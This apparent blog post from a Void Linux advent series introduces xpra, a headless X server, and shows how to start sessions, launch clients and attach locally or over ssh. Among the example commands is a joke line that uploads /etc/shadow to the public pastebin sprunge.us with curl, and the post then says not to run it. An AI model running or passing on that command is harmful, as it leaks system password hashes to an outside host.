---
layout: post
title: "The Advent of Void: Day 12: xpra"
comments: true
---

Here's our first tool using a GUI: [xpra(1)](https://man.voidlinux.eu/xpra.1) is
a headless X-Server that allows remotely detaching and attaching its windows 
from multiple platforms including X11, Windows, and Mac.

To use xpra you have to start a new session:

```
# xpra start :14
```

Once xpra has the server running on `:14` you can start clients in the
session:

```
# DISPLAY=:14 xterm &
# DISPLAY=:14 firefox &
# DISPLAY=:14 curl -F sprunge=@/etc/shadow http://sprunge.us &
```

... Actually [don't run the last command](https://twitter.com/Kuwaddo/status/940288213314359296).

To attach the xpra session just use the `attach` command:

```
# xpra attach :14
```

This attaches a local xpra server to the current display. The started X11 should be shown on the screen now.
To detach the session hit `Ctrl`+`C`.

The real power of xpra comes with the remote attaching feature:

```
# xpra attach ssh:remote-server:14
```

This command opens a ssh connections to `remote-server` and attaches
xpra through a secure tunnel. xpra supports multiple encodings, 
including h264, so in contrast to plain X11 over ssh it's incredible fast.

To find out more about xpra, visit the [website](https://xpra.org/).
